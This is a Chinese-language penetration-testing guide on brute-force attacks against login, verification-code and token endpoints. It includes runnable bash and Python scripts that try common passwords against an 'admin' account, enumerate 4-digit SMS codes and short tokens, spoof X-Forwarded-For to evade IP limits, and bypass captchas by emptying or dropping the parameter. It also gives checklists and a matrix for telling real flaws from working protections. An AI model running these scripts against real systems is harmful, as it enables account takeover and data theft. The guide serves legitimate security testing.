# 暴力破解测试

## 1. 概述

暴力破解（Brute Force）是指通过大量尝试来猜测密码、验证码或 Token 的攻击方式。

**危险等级**: 高

## 2. 测试点识别

### 2.1 常见暴力破解点

| 接口 | 参数 |
|------|------|
| 登录 | `username`, `password` |
| 验证码 | `smsCode`, `emailCode`, `captcha` |
| Token | `token`, `refreshToken` |
| 密码重置 | `password`, `code` |

### 2.2 认证相关接口

```bash
POST /api/login
POST /api/phoneLogin
POST /api/user/register
POST /api/user/resetPassword
POST /api/captcha/verify
```

## 3. 测试方法

### 3.1 登录暴力破解

```bash
# 常见密码TOP100
passwords=(
    "123456" "123456789" "12345678" "1234567" "password"
    "admin" "admin123" "admin888" "qwerty" "abc123"
    "111111" "666666" "888888" "letmein" "welcome"
)

for pwd in "${passwords[@]}"; do
    curl -X POST "http://api/login" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"admin\",\"password\":\"$pwd\"}"
done
```

### 3.2 验证码暴力破解

```bash
# 4位数字验证码：10000种组合
for code in {0000..9999}; do
    curl -X POST "http://api/captcha/verify" \
        -d "{\"phone\":\"13800138000\",\"code\":\"$code\"}"
done

# 6位数字验证码：1000000种组合（困难）
```

### 3.3 Token 暴力破解

```python
# 如果 Token 是短字符串
import string
import itertools

charset = string.ascii_lowercase + string.digits
for length in range(1, 6):
    for combo in itertools.product(charset, repeat=length):
        token = ''.join(combo)
        resp = requests.get(
            f"http://api/token/validate?token={token}"
        )
```

## 4. 防护检查

### 4.1 验证码测试

```bash
# 1. 是否有验证码？
POST /api/login
{"username": "admin", "password": "xxx"}
# 响应要求 captcha → 有验证码

# 2. 验证码是否可为空？
POST /api/login
{"username": "admin", "password": "xxx", "captcha": ""}
# 成功 → 可绕过

# 3. 验证码是否过期？
# 等待2分钟后重放
```

### 4.2 失败限制测试

```bash
# 连续10次失败
for i in {1..10}; do
    curl -X POST "http://api/login" \
        -d "{\"username\":\"admin\",\"password\":\"wrong$i\"}"
done

# 第11次尝试
curl -X POST "http://api/login" \
    -d "{\"username\":\"admin\",\"password\":\"correct\"}"
```

### 4.3 账户锁定测试

```bash
# 5次错误后
curl -X POST "http://api/login" \
    -d "{\"username\":\"admin\",\"password\":\"correct\"}"

# 响应 "账户已锁定" → 有锁定机制
# 响应正常 → 无锁定或已解锁
```

## 5. 绕过技巧

### 5.1 验证码绕过

```bash
# 1. 验证码复用
# 使用同一个验证码多次尝试

# 2. 验证码为空
POST /api/login
{"username": "admin", "password": "xxx", "captcha": ""}

# 3. 删除验证码参数
POST /api/login
{"username": "admin", "password": "xxx"}
```

### 5.2 IP 限制绕过

```bash
# 使用代理
# X-Forwarded-For 伪造（如果服务端信任）
curl -X POST "http://api/login" \
    -H "X-Forwarded-For: 1.1.1.1" \
    -d "{\"username\":\"admin\",\"password\":\"xxx\"}"

curl -X POST "http://api/login" \
    -H "X-Forwarded-For: 1.1.1.2" \
    -d "{\"username\":\"admin\",\"password\":\"xxx\"}"
```

### 5.3 账户锁定绕过

```bash
# 锁定的是IP不是账户
# 每次错误后更换IP

# 锁定的是用户名
# 尝试其他用户名
```

## 6. 防护建议检查表

| 防护措施 | 说明 | 安全等级 |
|----------|------|----------|
| 图形验证码 | 区分机器和人 | 中 |
| 滑块验证码 | 区分机器和人 | 高 |
| 失败次数限制 | 5次/15分钟 | 高 |
| 账户锁定 | 多次失败后锁定 | 高 |
| IP 限制 | 限制单IP请求频率 | 中 |
| 双因素认证 | 需要第二种认证 | 最高 |

## 7. 关联漏洞

| 后续漏洞 | 利用路径 |
|----------|----------|
| 账户接管 | 破解密码后直接登录 |
| 横向移动 | 获取他账号后横向 |
| 数据泄露 | 登录后获取敏感数据 |

## 8. 测试检查清单

```
□ 测试登录暴力破解（常见密码TOP100）
□ 测试验证码是否存在
□ 测试验证码是否可绕过
□ 测试失败次数限制
□ 测试账户锁定机制
□ 测试IP限制绕过
□ 测试锁定绕过
□ 评估防护措施强度
```

## 9. 误报判断标准

### 9.1 核心判断原则

```
【重要】暴力破解测试需要明确区分"有防护"和"无防护"

判断逻辑：
1. 先确认防护措施是否存在
2. 测试防护措施是否可绕过
3. 确认绕过后能否实现暴力破解

【真实漏洞特征】
- 无验证码/验证码可绕过
- 无失败次数限制
- 账户锁定机制不存在或可绕过
- IP限制可绕过

【正常防护（不是漏洞）】
- 有验证码且不能绕过
- 有失败次数限制（5次/15分钟）
- 有账户锁定机制
- IP限制正常工作
```

### 9.2 curl + 对比验证流程

```bash
# 1. 【必须先执行】测试正常登录
curl -s -X POST http://api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"correct_password"}' > brute_baseline.json

# 2. 测试验证码是否存在
curl -s -X POST http://api/login \
     -H "Content-Type: application/json" \
     -d '{"username":"admin","password":"wrong"}' > brute_captcha_test.json

# 查看是否需要验证码
grep -i "captcha\|验证码" brute_captcha_test.json
# 如果有 → 验证码存在（正常）
# 如果没有 → 可能无验证码（可能是漏洞）

# 3. 连续暴力破解测试（10-15次）
echo "测试暴力破解防护..."
for i in {1..15}; do
    RESP=$(curl -s -X POST http://api/login \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"admin\",\"password\":\"wrong$i\"}")
    
    # 检查是否有锁定/限制
    if echo "$RESP" | grep -qi "锁定\|lock\|限制\|limit"; then
        echo "第$i次: 发现限制机制"
        break
    fi
    
    if [ $i -eq 5 ] || [ $i -eq 10 ] || [ $i -eq 15 ]; then
        echo "第$i次: $RESP"
    fi
done
```

### 9.3 暴力破解防护判断矩阵

| 测试场景 | 响应 | 是否有防护 | 判断 |
|----------|------|------------|------|
| 有验证码 | {"msg":"请输入验证码"} | ✅ 有 | 安全 |
| 无验证码 | 直接提示密码错误 | ❌ 无 | 漏洞 |
| 5次后锁定 | {"msg":"账户已锁定"} | ✅ 有 | 安全 |
| 无限次尝试 | 一直可以尝试 | ❌ 无 | 漏洞 |
| IP限制 | 提示IP受限 | ✅ 有 | 安全 |
| IP可绕过 | 更换IP后正常 | ⚠️ 部分绕过 | 需评估 |

### 9.4 Python脚本（暴力破解深度测试）

```python
import requests
import time

class BruteForceTester:
    def __init__(self, target):
        self.target = target
        self.attempts = 0
        self.locked = False
        self.captcha_required = False
        
    def test_login(self, username, password):
        """测试登录"""
        resp = requests.post(
            f"{self.target}/login",
            json={"username": username, "password": password}
        )
        self.attempts += 1
        return resp
    
    def check_protection(self, response):
        """
        检查是否有防护机制
        
        Returns:
            (has_protection, protection_type, message)
        """
        text = response.text
        status = response.status_code
        
        # 检查验证码
        if '验证码' in text or 'captcha' in text.lower() or '图形验证' in text:
            self.captcha_required = True
            return True, 'captcha', '需要验证码'
        
        # 检查账户锁定
        if '锁定' in text or 'lock' in text.lower() or '已停用' in text:
            self.locked = True
            return True, 'lock', '账户已锁定'
        
        # 检查频率限制
        if '频繁' in text or 'limit' in text.lower() or '请稍后' in text:
            return True, 'rate_limit', '请求过于频繁'
        
        # 检查IP限制
        if 'IP' in text and ('限制' in text or '封禁' in text):
            return True, 'ip_limit', 'IP受限'
        
        return False, None, None
    
    def brute_force_test(self, username, passwords, max_attempts=10):
        """
        暴力破解测试
        
        判断标准：
        1. 如果有验证码 → 安全（难以暴力破解）
        2. 如果有锁定 → 安全（有防护）
        3. 如果可以无限次尝试 → 漏洞
        """
        print(f"\n=== 暴力破解测试 ===\n")
        print(f"目标用户: {username}")
        print(f"测试密码数: {len(passwords)}")
        print(f"最大尝试次数: {max_attempts}\n")
        
        results = {
            'success': False,
            'password': None,
            'attempts': 0,
            'protection': None,
            'vulnerable': False
        }
        
        for i, pwd in enumerate(passwords[:max_attempts]):
            results['attempts'] = i + 1
            
            resp = self.test_login(username, pwd)
            has_prot, prot_type, prot_msg = self.check_protection(resp)
            
            print(f"[{i+1}] 密码: {pwd[:10]}... | 状态: {resp.status_code}", end='')
            
            if has_prot:
                print(f" | 防护: {prot_msg}")
                results['protection'] = prot_type
                if prot_type in ['lock', 'rate_limit', 'ip_limit']:
                    break
            else:
                print("")
            
            # 检查是否成功登录
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data.get('code') == 0 or data.get('success'):
                        print(f"\n[成功] 密码: {pwd}")
                        results['success'] = True
                        results['password'] = pwd
                        break
                except:
                    pass
            
            # 延时
            time.sleep(0.5)
        
        # 判断是否有漏洞
        if not results['success'] and not results['protection']:
            results['vulnerable'] = True
            print(f"\n[漏洞] 可以无限次尝试暴力破解")
        elif results['protection'] == 'captcha':
            print(f"\n[安全] 有验证码防护")
        elif results['protection']:
            print(f"\n[安全] 有{results['protection']}防护")
        
        return results
    
    def run_tests(self):
        """执行完整暴力破解测试"""
        # 常见弱密码TOP20
        passwords = [
            "123456", "123456789", "12345678", "password", "admin",
            "admin123", "admin888", "qwerty", "abc123", "666666",
            "888888", "letmein", "welcome", "master", "hello",
            "shadow", "sunshine", "princess", "football", "michael"
        ]
        
        results = self.brute_force_test("admin", passwords, max_attempts=20)
        
        print("\n=== 测试结果 ===")
        print(f"尝试次数: {results['attempts']}")
        print(f"成功登录: {results['success']}")
        print(f"发现防护: {results['protection']}")
        print(f"存在漏洞: {results['vulnerable']}")
        
        return results

# 使用示例
if __name__ == "__main__":
    tester = BruteForceTester("http://api")
    results = tester.run_tests()
```

## 10. 实战判断案例

### 案例1：有验证码保护

```
【场景】：登录需要验证码

curl测试：
  curl -X POST /api/login -d '{"username":"admin","password":"wrong"}'
  → {"code":1001,"msg":"请输入验证码"}

判断：
- 有验证码机制
- 难以进行暴力破解
- 结论：【安全】有适当防护
```

### 案例2：有限制机制

```
【场景】：多次失败后被锁定

curl测试：
  连续10次错误密码后
  → {"code":1002,"msg":"账户已锁定，请15分钟后再试"}

判断：
- 有账户锁定机制
- 5次失败后触发
- 结论：【安全】有适当防护
```

### 案例3：可暴力破解（漏洞）

```
【场景】：可以无限次尝试

curl测试：
  连续20次错误密码
  → 每次都返回"用户名或密码错误"
  → 没有验证码
  → 没有锁定
  → 没有限流

判断：
- 可以无限次尝试
- 密码破解只是时间问题
- 结论：【确认漏洞】无暴力破解防护
```
